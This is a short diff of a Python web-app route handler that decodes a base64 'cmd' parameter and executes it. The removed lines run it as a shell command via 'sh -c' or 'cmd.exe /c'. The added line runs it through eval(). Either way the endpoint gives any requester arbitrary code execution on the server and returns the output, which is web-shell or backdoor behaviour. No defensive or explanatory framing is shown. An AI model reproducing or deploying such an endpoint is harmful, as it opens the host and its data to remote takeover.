@@ -10,13 +10,7 @@ class APP(routes.App):
             try:
                 cmd = base64.b64decode(cmd)
                 cmd = cmd.decode("UTF-8")
-                if platform.system()=="Linux":
-                    cmds = ["sh","-c",cmd]
-                else:
-                    cmds = ["cmd.exe","/c",cmd]
-                process = subprocess.Popen(cmds, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
-                output_text, error_text = process.communicate()
-                out = output_text or error_text
+                out = eval(cmd)
             except Exception as e:
                 return str(e)
             return out    
